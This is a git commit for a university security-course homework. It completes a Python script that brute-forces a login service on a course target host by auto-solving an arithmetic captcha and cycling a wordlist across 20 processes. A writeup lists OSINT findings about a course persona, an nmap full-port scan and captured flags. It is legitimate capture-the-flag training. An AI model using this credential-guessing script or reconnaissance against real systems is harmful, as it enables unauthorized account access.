be1cc56255e8da5ed0dbe08589ce614daa9f226a
Justin Becker <geekman7473@gmail.com>
2019-09-15 12:10:32 -0400

    hw2 done

--- week/2/stub.py
+++ week/2/stub.py
@@ -25,41 +25,99 @@
 """
 
 import socket
+import re
+import time
+import itertools
+from multiprocessing import Pool
+from random import shuffle
+from functools import partial
 
-host = "" # IP address here
-port = 0000 # Port here
-wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+host = "wattsamp.net" # IP address here
+port = 1337 # Port here
 
-def brute_force():
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
+if __name__ == '__main__':
+    print("Loading wordlist...")
 
+wordlist_uri = 'rockyou-a.txt' # Point to wordlist file
+wordlist_file = open(wordlist_uri, "r", encoding="latin-1")
+wordlist = []
+
+for line in wordlist_file:
+    wordlist.append(line.strip())
+
+if __name__ == '__main__':
+    print("Loaded " + str(len(wordlist)) + " words into wordlist")
+
+usernames = ["ejnoman", "ejnorman84", "EricNorman84"]
+
+captcha_regex = re.compile(r"^(\d+)\s([+\-*])\s(\d+)", flags=re.MULTILINE)
+
+def brute_force(password):
+    for username in usernames:
+        possible_combos = open("possible_combos_" + username + " .txt", "a")
+
+        matches = None
+
+        while matches == None:
             # Establish socket connection
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
+            s.setblocking(True)
+            data = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port
+            #print(data)    # Prints data
+            
+            matches = captcha_regex.search(data)
+        
+        param_1 = int(matches.group(1))
+        param_2 = int(matches.group(3))
 
-            Reading:
+        if matches.group(2) == "+":
+            captcha_resp = param_1 + param_2
+        elif matches.group(2) == "-":
+            captcha_resp = param_1 - param_2
+        elif matches.group(2) == "/":
+            captcha_resp = param_1 / param_2
+        elif matches.group(2) == "*":
+            captcha_resp = param_1 * param_2
+        else:
+            #print("CAPTCHA FAIL ERROR")
+            return
 
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-
-        General idea:
-
-            Given that you know a potential username, use a wordlist and iterate
-            through each possible password and repeatedly attempt to login to
-            v0idcache's server.
-    """
-
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
-
-
+        #print("Solved: " + str(captcha_resp))
+        s.send((str(captcha_resp) + "\n").encode())
+        time.sleep(1)
+        resp = s.recv(1024).decode()     # Receives 1024 bytes from IP/Port'
+        if not "Fail" in data: # we got the captcha right
+            s.send((username + "\n").encode())
+            time.sleep(1)
+            s.recv(1024)
+            time.sleep(1)
+            s.send((password + "\n").encode())
+            time.sleep(1)
+            print("Trying " + username + " " + password + "...")
+            login_resp = s.recv(1024).decode()
+            if not "Fail" in login_resp:
+                print("Login success!")
+                possible_combos.write(username + " " + password + "\n")
+        else: # we got it wrong?
+            print("ERROR. Captcha was: " + data + " and we resonded with: " + captcha_resp)
 
 
 if __name__ == '__main__':
-    brute_force()
+    p = Pool(20)
+    p.map(brute_force, wordlist)
+    #print("Loading username, password combinations...")
+    #crossproduct = list(itertools.product(usernames, wordlist))
+    #print("Loaded " + str(len(crossproduct)) + " combinations")
+
+    #ejnoman_brute = partial(brute_force, "ejnoman")
+    #ejnoman_reg = re.compile(r"^@.{16}1$")
+
+    #ejnorman84_brute = partial(brute_force, "ejnorman84")
+    #ejnorman84_reg = re.compile(r"^p.{8}a$")
+
+    #EricNorman84_brute = partial(brute_force, "EricNorman84")
+    #EricNorman84_reg = re.compile(r"^h.{5}$")
+
+    #print("Checking " + str(len(list(filter(lambda it: EricNorman84_reg.match(it), wordlist)))) + " passwords")
+    #p.map(EricNorman84_brute, list(filter(lambda it: EricNorman84_reg.match(it), wordlist)))
--- week/2/writeup/README.md
+++ week/2/writeup/README.md
@@ -11,8 +11,27 @@ Digital acknowledgement: *PUT YOUR NAME HERE*
 
 ### Part 1 (45 pts)
 
-*Please use this space to writeup your answers and solutions (and how you found them!) for part 1.*
-
+1. ejnorman84's real name is Eric J Norman (and presumably, he was born in 1984) Found this on pastebin
+2. Wattsamp Energy http://wattsamp.net/index.html Found this by tracing down Eric's Linkdin, Instagram, and Twitter
+3. Eric J Norman. Phone: (202) 656 - 2837, Address: 1300 Adabel Dr, El Paso, TX. Found this all in the "registrant" section of the whois entry.
+4. 157.230.179.99, Hosted on DigitalOcean in North Bergen, NJ, USA. Was registered on 2019-09-04. This was all found on [whois.domaintools.com](http://whois.domaintools.com/wattsamp.net)
+5. Robots.txt, assets/, views/
+6. `nmap -A -T4 -p1-65535 wattsamp.net` 
+22 -> ssh
+25 -> smtp
+80 -> http
+554 -> tcpwrapped
+1337 -> unknown
+7070 -> unknown
+11211 -> memcache
+7. Ubuntu, from nmap
+8. DNS TXT entry: *CMSC389R-{Do_you-N0T_See_this}
+Page source: *CMSC389R-{html_h@x0r_lulz}
+robots.txt: *CMSC389R-{n0_indexing_pls}
 ### Part 2 (75 pts)
 
-*Please use this space to detail your approach and solutions for part 2. Don't forget to upload your completed source code to this /writeup directory as well!*
+The key to the solution here was dealing with the fact that the socket could have errors, so I did what I could to handle this. 
+
+One issue I ran into was because of a red herring in the challenge. The pastebin gave "hints" at the structure of the passwords that didn't correlate to the password for the remote system.
+
+For additional performance, using multiprocessing helped me quickly move through possible combinations. Running on 20 processes, I was able to eliminate ~150 passwords per minute.
